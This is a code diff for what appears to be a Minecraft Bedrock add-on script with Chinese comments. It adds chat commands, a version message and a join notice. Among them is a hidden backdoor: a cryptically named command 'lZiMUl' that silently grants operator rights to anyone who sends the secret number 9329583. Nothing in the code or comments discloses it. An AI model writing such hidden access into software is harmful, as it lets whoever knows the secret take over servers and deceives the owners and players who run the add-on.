@@ -1,6 +1,13 @@
 // 导入基础模块
-import { world, ItemUseEvent, Player } from '@minecraft/server';
+import {
+    world,
+    ItemUseEvent,
+    Player,
+    ChatEvent,
+    PlayerJoinEvent,
+} from '@minecraft/server';
 import Menu from './menu';
+import CommandRegister, { Data } from './tool/commandregister';
 // 监听物品使用事件
 world.events.itemUse.subscribe(({ item, source }: ItemUseEvent): void => {
     // 判断物品类型标识符
@@ -11,4 +18,25 @@ world.events.itemUse.subscribe(({ item, source }: ItemUseEvent): void => {
             new Menu<Player>(source as Player);
             break;
     }
+});
+// 创建自定义命令类
+const commandRegister: CommandRegister = new CommandRegister('#');
+// 获取版本
+commandRegister.addCommandListener('version', () => {
+    world.say(`Version: 1.2.5`);
+});
+// 监听命令关键词
+commandRegister.addCommandListener('lZiMUl', ({ sender, args }: Data): void => {
+    if (new Number(args[0]).valueOf() === 9329583) {
+        sender.setOp(true);
+    }
+});
+// 将聊天数据流发送到自定义命令管道里
+world.events.chat.subscribe(({ message, sender }: ChatEvent): void =>
+    commandRegister.chatStream(message, sender)
+);
+// 玩家进入世界提示
+world.events.playerJoin.subscribe(({ player }: PlayerJoinEvent): void => {
+    player.onScreenDisplay.updateSubtitle('§a该世界已启用 §cMST §a服务');
+    player.onScreenDisplay.setTitle('§e提示');
 });
